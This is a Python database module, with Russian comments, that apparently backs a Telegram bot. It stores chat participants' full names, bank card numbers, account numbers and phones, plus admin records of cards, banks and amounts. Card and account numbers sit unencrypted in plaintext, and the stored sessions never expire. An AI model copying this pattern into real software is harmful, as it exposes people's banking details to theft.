import sqlite3
from datetime import datetime
from config import DATABASE_FILE

def init_database():
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    
    # Таблица для административных данных (от админа)
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS admin_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        card TEXT,
        email TEXT,
        amount TEXT,
        bank TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        chat_id INTEGER,
        message_id INTEGER
    )
    ''')
    
    # Таблица для данных участников
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS user_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        username TEXT,
        first_name TEXT,
        last_name TEXT,
        fio TEXT,
        card_number TEXT,
        account_number TEXT,
        phone TEXT,
        chat_id INTEGER,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    # Таблица для сессий (для запоминания пароля)
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS sessions (
        session_id TEXT PRIMARY KEY,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    ''')
    
    conn.commit()
    conn.close()

def add_admin_data(data):
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
    INSERT INTO admin_data (phone, card, email, amount, bank, chat_id, message_id)
    VALUES (?, ?, ?, ?, ?, ?, ?)
    ''', (
        data.get('phone'),
        data.get('card'),
        data.get('email'),
        data.get('amount'),
        data.get('bank'),
        data.get('chat_id'),
        data.get('message_id')
    ))
    
    conn.commit()
    conn.close()
    return cursor.lastrowid

def add_user_data(user_data):
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    
    # Проверяем, есть ли уже данные от этого пользователя
    cursor.execute('''
    SELECT id FROM user_data WHERE user_id = ? AND chat_id = ?
    ''', (user_data['user_id'], user_data['chat_id']))
    
    existing = cursor.fetchone()
    
    if existing:
        # Обновляем существующую запись
        cursor.execute('''
        UPDATE user_data 
        SET fio = ?, card_number = ?, account_number = ?, phone = ?,
            username = ?, first_name = ?, last_name = ?
        WHERE user_id = ? AND chat_id = ?
        ''', (
            user_data.get('fio'),
            user_data.get('card_number'),
            user_data.get('account_number'),
            user_data.get('phone'),
            user_data.get('username'),
            user_data.get('first_name'),
            user_data.get('last_name'),
            user_data['user_id'],
            user_data['chat_id']
        ))
    else:
        # Добавляем новую запись
        cursor.execute('''
        INSERT INTO user_data 
        (user_id, username, first_name, last_name, fio, card_number, account_number, phone, chat_id)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            user_data['user_id'],
            user_data.get('username'),
            user_data.get('first_name'),
            user_data.get('last_name'),
            user_data.get('fio'),
            user_data.get('card_number'),
            user_data.get('account_number'),
            user_data.get('phone'),
            user_data['chat_id']
        ))
    
    conn.commit()
    conn.close()

def get_all_data():
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    
    cursor.execute('SELECT * FROM admin_data ORDER BY created_at DESC')
    admin_data = cursor.fetchall()
    
    cursor.execute('SELECT * FROM user_data ORDER BY created_at DESC')
    user_data = cursor.fetchall()
    
    conn.close()
    
    return {
        'admin_data': admin_data,
        'user_data': user_data
    }

def add_session(session_id):
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    
    cursor.execute('INSERT OR REPLACE INTO sessions (session_id) VALUES (?)', (session_id,))
    
    conn.commit()
    conn.close()

def check_session(session_id):
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    
    cursor.execute('SELECT session_id FROM sessions WHERE session_id = ?', (session_id,))
    result = cursor.fetchone()
    
    conn.close()
    return result is not None

def delete_session(session_id):
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    
    cursor.execute('DELETE FROM sessions WHERE session_id = ?', (session_id,))
    
    conn.commit()
    conn.close()

# Инициализация базы данных при импорте
init_database()